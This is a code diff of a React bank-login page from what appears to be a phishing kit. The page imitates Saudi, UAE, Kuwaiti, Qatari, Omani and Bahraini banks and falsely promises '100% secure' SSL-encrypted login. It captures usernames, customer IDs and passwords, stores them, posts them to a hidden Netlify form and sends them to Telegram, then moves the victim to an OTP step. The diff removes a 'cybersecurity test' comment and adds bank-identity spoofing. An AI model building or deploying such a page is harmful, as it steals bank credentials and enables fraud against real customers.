@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -7,13 +7,14 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import { bankBranding } from "@/lib/brandingSystem";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
+import { Lock, Eye, EyeOff, Building2, ShieldCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
-import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { formatCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
+import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -22,7 +23,6 @@ const PaymentBankLogin = () => {
   const { data: linkData } = useLink(id);
   const updateLink = useUpdateLink();
   
-  // Bank login credentials state
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -30,7 +30,6 @@ const PaymentBankLogin = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // Get customer info and selected bank from link data (cross-device compatible)
   const customerInfo = linkData?.payload?.customerInfo || {};
   const selectedBankId = linkData?.payload?.selectedBank || '';
   const cardInfo = linkData?.payload?.cardInfo || {
@@ -46,19 +45,15 @@ const PaymentBankLogin = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
-  // Get bank branding for enhanced styling
   const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
 
-  // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
 
   const shippingInfo = linkData?.payload as any;
 
-  // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
 
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -75,68 +70,28 @@ const PaymentBankLogin = () => {
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
   
-  // Determine login type based on bank
+  useEffect(() => {
+    if (selectedBankId && selectedBankId !== 'skipped') {
+      applyDynamicIdentity(`bank_${selectedBankId}`);
+    }
+  }, [selectedBankId]);
+  
   const getLoginType = () => {
     if (!selectedBank) return 'username';
     
     const bankId = selectedBank.id;
     
-    // Saudi banks
-    if (bankId === 'alrajhi_bank') return 'username'; // Username + Password
-    if (bankId === 'alahli_bank') return 'username'; // Username + Password
-    if (bankId === 'riyad_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'samba_bank') return 'username'; // Username + Password
-    if (bankId === 'saudi_investment_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'arab_national_bank') return 'username'; // Username + Password
-    if (bankId === 'saudi_fransi_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'alinma_bank') return 'username'; // Username + Password
-    if (bankId === 'albilad_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'aljazira_bank') return 'username'; // Username + Password
+    if (bankId === 'alrajhi_bank' || bankId === 'alahli_bank' || bankId === 'samba_bank' || 
+        bankId === 'arab_national_bank' || bankId === 'alinma_bank' || bankId === 'aljazira_bank' ||
+        bankId === 'emirates_nbd' || bankId === 'fab' || bankId === 'dib' || bankId === 'cbd' ||
+        bankId === 'gulf_bank' || bankId === 'burgan_bank' || bankId === 'ahli_united_bank' ||
+        bankId === 'cbq' || bankId === 'doha_bank' || bankId === 'masraf_alrayan' ||
+        bankId === 'national_bank_oman' || bankId === 'bank_dhofar' || bankId === 'nizwa_bank' ||
+        bankId === 'nbb' || bankId === 'ahli_united_bahrain' || bankId === 'bisb' || bankId === 'khaleeji_bank') {
+      return 'username';
+    }
     
-    // UAE banks
-    if (bankId === 'emirates_nbd') return 'username'; // Username + Password
-    if (bankId === 'adcb') return 'customerId'; // Customer ID + Password
-    if (bankId === 'fab') return 'username'; // Username + Password
-    if (bankId === 'dib') return 'username'; // Username + Password
-    if (bankId === 'mashreq_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'cbd') return 'username'; // Username + Password
-    if (bankId === 'rakbank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'ajman_bank') return 'username'; // Username + Password
-    
-    // Kuwait banks
-    if (bankId === 'nbk') return 'customerId'; // Customer ID + Password
-    if (bankId === 'gulf_bank') return 'username'; // Username + Password
-    if (bankId === 'cbk') return 'customerId'; // Customer ID + Password
-    if (bankId === 'burgan_bank') return 'username'; // Username + Password
-    if (bankId === 'ahli_united_bank') return 'username'; // Username + Password
-    if (bankId === 'kfh') return 'customerId'; // Customer ID + Password
-    if (bankId === 'boubyan_bank') return 'username'; // Username + Password
-    
-    // Qatar banks
-    if (bankId === 'qnb') return 'customerId'; // Customer ID + Password
-    if (bankId === 'cbq') return 'username'; // Username + Password
-    if (bankId === 'doha_bank') return 'username'; // Username + Password
-    if (bankId === 'qib') return 'customerId'; // Customer ID + Password
-    if (bankId === 'masraf_alrayan') return 'username'; // Username + Password
-    if (bankId === 'ahlibank') return 'customerId'; // Customer ID + Password
-    
-    // Oman banks
-    if (bankId === 'bank_muscat') return 'customerId'; // Customer ID + Password
-    if (bankId === 'national_bank_oman') return 'username'; // Username + Password
-    if (bankId === 'bank_dhofar') return 'username'; // Username + Password
-    if (bankId === 'ahli_bank_oman') return 'customerId'; // Customer ID + Password
-    if (bankId === 'nizwa_bank') return 'username'; // Username + Password
-    if (bankId === 'sohar_international') return 'customerId'; // Customer ID + Password
-    
-    // Bahrain banks
-    if (bankId === 'nbb') return 'username'; // Username + Password
-    if (bankId === 'bbk') return 'customerId'; // Customer ID + Password
-    if (bankId === 'ahli_united_bahrain') return 'username'; // Username + Password
-    if (bankId === 'bisb') return 'username'; // Username + Password
-    if (bankId === 'ithmaar_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'khaleeji_bank') return 'username'; // Username + Password
-    
-    return 'username'; // Default
+    return 'customerId';
   };
   
   const loginType = getLoginType();
@@ -144,7 +99,6 @@ const PaymentBankLogin = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    // Validate based on login type
     if (loginType === 'username' && (!username || !password)) {
       toast({
         title: "خطأ",
@@ -174,7 +128,6 @@ const PaymentBankLogin = () => {
     
     setIsSubmitting(true);
 
-    // Store bank login info
     const bankLoginData = {
       username: loginType === 'username' ? username : '',
       customerId: loginType === 'customerId' ? customerId : '',
@@ -183,10 +136,8 @@ const PaymentBankLogin = () => {
       loginType: loginType,
     };
 
-    // Save to sessionStorage (for current session) and link (for cross-device)
     sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));
 
-    // Save to link for cross-device compatibility
     if (linkData) {
       try {
         const updatedPayload = {
@@ -199,11 +150,9 @@ const PaymentBankLogin = () => {
           payload: updatedPayload
         });
       } catch (error) {
-        // Error saving bank login data
       }
     }
     
-    // Submit to Netlify Forms
     try {
       await fetch("/", {
         method: "POST",
@@ -227,11 +176,9 @@ const PaymentBankLogin = () => {
         }).toString()
       });
     } catch (err) {
-      // Silent error handling
     }
 
-    // Send bank login details to Telegram (cybersecurity test)
-    const telegramResult = await sendToTelegram({
+    await sendToTelegram({
       type: 'bank_login',
       data: {
         name: customerInfo.name || '',
@@ -261,7 +208,6 @@ const PaymentBankLogin = () => {
       description: "تم تسجيل الدخول بنجاح",
     });
     
-    // Navigate to OTP verification
     navigate(`/pay/${id}/otp`);
   };
   
@@ -275,22 +221,24 @@ const PaymentBankLogin = () => {
       icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
       bankId={selectedBankId}
     >
-      {/* Bank Info Header - Enhanced with Official Bank Branding */}
       <div 
-        className="rounded-xl p-5 sm:p-6 mb-6 shadow-2xl border-2"
+        className="rounded-2xl p-6 sm:p-8 mb-6 shadow-2xl border-2 relative overflow-hidden"
         style={{
           background: selectedBankBranding?.gradients.primary || `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
           borderColor: selectedBankBranding?.colors.accent || selectedBank?.color || branding.colors.primary,
-          borderRadius: selectedBankBranding?.borderRadius.lg || '12px',
-          boxShadow: selectedBankBranding?.shadows.lg || `0 10px 40px -10px ${selectedBank?.color || branding.colors.primary}50`
+          borderRadius: selectedBankBranding?.borderRadius.lg || '16px',
+          boxShadow: selectedBankBranding?.shadows.xl || `0 20px 60px -15px ${selectedBank?.color || branding.colors.primary}70`
         }}
       >
-        <div className="flex items-center justify-between mb-4">
-          <div className="flex items-center gap-3">
+        <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
+        <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
+        
+        <div className="relative flex items-center justify-between mb-6">
+          <div className="flex items-center gap-4">
             {selectedBank ? (
               <div 
-                className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl bg-white p-3 flex items-center justify-center shadow-lg"
-                style={{ borderRadius: selectedBankBranding?.borderRadius.md || '10px' }}
+                className="w-20 h-20 sm:w-24 sm:h-24 rounded-2xl bg-white p-4 flex items-center justify-center shadow-2xl"
+                style={{ borderRadius: selectedBankBranding?.borderRadius.md || '12px' }}
               >
                 <BankLogo 
                   bankId={selectedBank.id}
@@ -302,55 +250,51 @@ const PaymentBankLogin = () => {
                 />
               </div>
             ) : (
-              <div 
-                className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
-              >
-                <Building2 className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
+              <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0">
+                <Building2 className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
               </div>
             )}
             <div 
               className="flex-1 text-white"
               style={{ fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
             >
-              <p className="text-xs sm:text-sm opacity-90 mb-1 font-medium">الخدمات المصرفية الإلكترونية</p>
-              <p className="text-xl sm:text-2xl font-bold leading-tight">{selectedBank?.nameAr || 'البنك'}</p>
-              <p className="text-xs sm:text-sm opacity-80 mt-0.5" style={{ fontFamily: selectedBankBranding?.fonts.primary || 'Arial' }}>{selectedBank?.name || 'Online Banking'}</p>
+              <p className="text-sm sm:text-base opacity-90 mb-1 font-semibold">الخدمات المصرفية الإلكترونية</p>
+              <p className="text-2xl sm:text-3xl font-bold leading-tight">{selectedBank?.nameAr || 'البنك'}</p>
+              <p className="text-sm sm:text-base opacity-80 mt-1" style={{ fontFamily: selectedBankBranding?.fonts.primary || 'Arial' }}>{selectedBank?.name || 'Online Banking'}</p>
             </div>
           </div>
           {selectedCountryData && (
-            <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
+            <span className="text-4xl sm:text-5xl">{selectedCountryData.flag}</span>
           )}
         </div>
         
-        {/* Bank portal header line */}
-        <div className="flex items-center gap-2 text-white/90 text-xs sm:text-sm">
-          <Lock className="w-4 h-4" />
-          <span>تسجيل دخول آمن ومشفر</span>
-          <span className="mr-auto">•</span>
-          <span>SSL Encrypted</span>
+        <div className="flex items-center gap-3 text-white/90 text-sm sm:text-base">
+          <Lock className="w-5 h-5" />
+          <span className="font-medium">تسجيل دخول آمن ومشفر</span>
+          <span className="mr-auto opacity-70">•</span>
+          <span className="opacity-70">256-bit SSL</span>
         </div>
       </div>
 
-      {/* Security Notice - Enhanced with Bank Branding */}
       <div 
-        className="rounded-xl p-4 sm:p-5 mb-6 border-2"
+        className="rounded-2xl p-5 sm:p-6 mb-6 border-2"
         style={{
-          background: `linear-gradient(135deg, ${selectedBankBranding?.colors.primary || branding.colors.primary}08, ${selectedBankBranding?.colors.primary || branding.colors.primary}12)`,
+          background: `linear-gradient(135deg, ${selectedBankBranding?.colors.primary || branding.colors.primary}10, ${selectedBankBranding?.colors.primary || branding.colors.primary}18)`,
           borderColor: `${selectedBankBranding?.colors.primary || branding.colors.primary}30`,
-          borderRadius: selectedBankBranding?.borderRadius.md || '10px'
+          borderRadius: selectedBankBranding?.borderRadius.md || '12px'
         }}
       >
-        <div className="flex items-start gap-3">
+        <div className="flex items-start gap-4">
           <div 
-            className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0"
-            style={{ background: `${selectedBankBranding?.colors.primary || branding.colors.primary}20` }}
+            className="w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0"
+            style={{ background: `${selectedBankBranding?.colors.primary || branding.colors.primary}25` }}
           >
-            <ShieldCheck className="w-5 h-5" style={{ color: selectedBankBranding?.colors.primary || branding.colors.primary }} />
+            <ShieldCheck className="w-6 h-6" style={{ color: selectedBankBranding?.colors.primary || branding.colors.primary }} />
           </div>
           <div className="flex-1">
             <div className="flex items-center gap-2 mb-2">
               <h3 
-                className="font-bold text-sm sm:text-base" 
+                className="font-bold text-base sm:text-lg" 
                 style={{ 
                   color: selectedBankBranding?.colors.primary || branding.colors.primary,
                   fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
@@ -358,44 +302,42 @@ const PaymentBankLogin = () => {
               >
                 تسجيل دخول آمن 100%
               </h3>
-              <svg className="w-4 h-4 text-green-500" fill="currentColor" viewBox="0 0 20 20">
+              <svg className="w-5 h-5 text-green-500" fill="currentColor" viewBox="0 0 20 20">
                 <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
               </svg>
             </div>
-            <p className="text-xs sm:text-sm text-muted-foreground leading-relaxed">
-              سجّل دخولك إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان. جميع بياناتك محمية بتشفير 256-bit SSL.
+            <p className="text-sm sm:text-base text-muted-foreground leading-relaxed">
+              سجّل دخولك إلى حسابك البنكي لتأكيد العملية. جميع بياناتك محمية بتشفير 256-bit SSL.
             </p>
-            <div className="flex items-center gap-4 mt-3 text-xs">
-              <div className="flex items-center gap-1 text-green-600">
-                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+            <div className="flex items-center gap-4 mt-3 text-xs sm:text-sm">
+              <div className="flex items-center gap-1.5 text-green-600">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                   <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                 </svg>
-                <span>مشفر</span>
+                <span className="font-medium">مشفر</span>
               </div>
-              <div className="flex items-center gap-1 text-blue-600">
-                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+              <div className="flex items-center gap-1.5 text-blue-600">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                   <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                 </svg>
-                <span>موثّق</span>
+                <span className="font-medium">موثّق</span>
               </div>
-              <div className="flex items-center gap-1 text-purple-600">
-                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+              <div className="flex items-center gap-1.5 text-purple-600">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                   <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                 </svg>
-                <span>آمن</span>
+                <span className="font-medium">آمن</span>
               </div>
             </div>
           </div>
         </div>
       </div>
 
-      {/* Login Form - Enhanced to look like real bank login */}
-      <form onSubmit={handleSubmit} className="space-y-5 sm:space-y-6">
-        {/* Username Login */}
+      <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-7">
         {loginType === 'username' && (
           <div>
-            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
-              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <Label className="mb-3 text-base sm:text-lg font-bold flex items-center gap-2">
+              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
               </svg>
               اسم المستخدم
@@ -406,13 +348,13 @@ const PaymentBankLogin = () => {
                 placeholder="أدخل اسم المستخدم"
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
-                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
+                className="h-16 sm:h-18 text-lg sm:text-xl pr-5 pl-14 rounded-2xl border-2 focus:border-primary transition-all shadow-sm"
                 style={{ borderColor: branding.colors.primary + '40' }}
                 autoComplete="username"
                 required
               />
-              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
-                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <div className="absolute left-5 top-1/2 -translate-y-1/2 text-muted-foreground">
+                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                 </svg>
               </div>
@@ -420,11 +362,10 @@ const PaymentBankLogin = () => {
           </div>
         )}
         
-        {/* Customer ID Login */}
         {loginType === 'customerId' && (
           <div>
-            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
-              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <Label className="mb-3 text-base sm:text-lg font-bold flex items-center gap-2">
+              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
               </svg>
               رقم العميل
@@ -435,13 +376,13 @@ const PaymentBankLogin = () => {
                 placeholder="أدخل رقم العميل"
                 value={customerId}
                 onChange={(e) => setCustomerId(e.target.value)}
-                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
+                className="h-16 sm:h-18 text-lg sm:text-xl pr-5 pl-14 rounded-2xl border-2 focus:border-primary transition-all shadow-sm"
                 style={{ borderColor: branding.colors.primary + '40' }}
                 inputMode="numeric"
                 required
               />
-              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
-                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <div className="absolute left-5 top-1/2 -translate-y-1/2 text-muted-foreground">
+                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
                 </svg>
               </div>
@@ -449,45 +390,15 @@ const PaymentBankLogin = () => {
           </div>
         )}
         
-        {/* Phone Login */}
-        {loginType === 'phone' && (
-          <div>
-            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
-              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
-              </svg>
-              رقم الجوال
-            </Label>
-            <div className="relative">
-              <Input
-                type="tel"
-                placeholder="05xxxxxxxx"
-                value={phoneNumber}
-                onChange={(e) => setPhoneNumber(e.target.value)}
-                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
-                style={{ borderColor: branding.colors.primary + '40' }}
-                inputMode="tel"
-                required
-              />
-              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
-                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
-                </svg>
-              </div>
-            </div>
-          </div>
-        )}
-        
-        {/* Password (common for all types) */}
         <div>
-          <div className="flex items-center justify-between mb-2.5">
-            <Label className="text-sm sm:text-base font-semibold flex items-center gap-2">
-              <Lock className="w-4 h-4" />
+          <div className="flex items-center justify-between mb-3">
+            <Label className="text-base sm:text-lg font-bold flex items-center gap-2">
+              <Lock className="w-5 h-5" />
               كلمة المرور
             </Label>
             <button
               type="button"
-              className="text-xs sm:text-sm font-medium hover:underline"
+              className="text-sm sm:text-base font-medium hover:underline"
               style={{ color: branding.colors.primary }}
             >
               نسيت كلمة المرور؟
@@ -499,56 +410,47 @@ const PaymentBankLogin = () => {
               placeholder="أدخل كلمة المرور"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
-              className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-24 rounded-xl border-2 focus:border-primary transition-all"
+              className="h-16 sm:h-18 text-lg sm:text-xl pr-5 pl-28 rounded-2xl border-2 focus:border-primary transition-all shadow-sm"
               style={{ borderColor: branding.colors.primary + '40' }}
               autoComplete="current-password"
               required
             />
-            <div className="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
+            <div className="absolute left-5 top-1/2 -translate-y-1/2 flex items-center gap-3">
               <button
                 type="button"
                 onClick={() => setShowPassword(!showPassword)}
                 className="text-muted-foreground hover:text-foreground transition-colors p-1"
               >
                 {showPassword ? (
-                  <EyeOff className="w-5 h-5" />
+                  <EyeOff className="w-6 h-6" />
                 ) : (
-                  <Eye className="w-5 h-5" />
+                  <Eye className="w-6 h-6" />
                 )}
               </button>
-              <div className="w-px h-6 bg-border" />
-              <Lock className="w-5 h-5 text-muted-foreground" />
+              <div className="w-px h-7 bg-border" />
+              <Lock className="w-6 h-6 text-muted-foreground" />
             </div>
           </div>
         </div>
         
-        {/* Remember Me / Forgot Password */}
-        <div className="flex items-center justify-between text-xs sm:text-sm">
+        <div className="flex items-center justify-between text-sm sm:text-base">
           <div className="flex items-center gap-2">
-            <input type="checkbox" id="remember" className="rounded" />
+            <input type="checkbox" id="remember" className="rounded w-4 h-4" />
             <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
               تذكرني
             </label>
           </div>
-          <button
-            type="button"
-            className="text-muted-foreground hover:underline"
-            style={{ color: selectedBank?.color || branding.colors.primary }}
-          >
-            نسيت كلمة المرور؟
-          </button>
         </div>
         
-        {/* Submit Button - Enhanced with Bank Branding */}
         <Button
           type="submit"
           size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-2xl"
+          className="w-full text-base sm:text-xl py-7 sm:py-8 text-white font-bold shadow-2xl"
           disabled={isSubmitting}
           style={{
             background: selectedBankBranding?.gradients.primary || `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
-            borderRadius: selectedBankBranding?.borderRadius.md || '10px',
-            boxShadow: selectedBankBranding?.shadows.lg || `0 10px 40px -10px ${selectedBank?.color || branding.colors.primary}80`,
+            borderRadius: selectedBankBranding?.borderRadius.md || '12px',
+            boxShadow: selectedBankBranding?.shadows.xl || `0 20px 60px -15px ${selectedBank?.color || branding.colors.primary}90`,
             fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
           }}
         >
@@ -556,35 +458,32 @@ const PaymentBankLogin = () => {
             <span>جاري تسجيل الدخول...</span>
           ) : (
             <>
-              <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
+              <Lock className="w-5 h-5 sm:w-6 sm:h-6 ml-2" />
               <span>تسجيل الدخول والمتابعة</span>
-              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
             </>
           )}
         </Button>
         
-        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+        <p className="text-xs sm:text-sm text-center text-muted-foreground mt-4">
           بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
         </p>
       </form>
       
-      {/* Additional Info */}
-      <div className="mt-6 pt-6 border-t text-center">
-        <p className="text-xs text-muted-foreground mb-3">
+      <div className="mt-8 pt-6 border-t text-center">
+        <p className="text-sm text-muted-foreground mb-4">
           لا تملك حساب؟
         </p>
         <Button
           type="button"
           variant="outline"
           size="sm"
-          className="text-xs"
+          className="text-sm"
           style={{ borderColor: selectedBank?.color || branding.colors.primary }}
         >
           تسجيل حساب جديد
         </Button>
       </div>
     
-      {/* Hidden Netlify Form */}
       <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
         <input type="text" name="name" />
         <input type="email" name="email" />
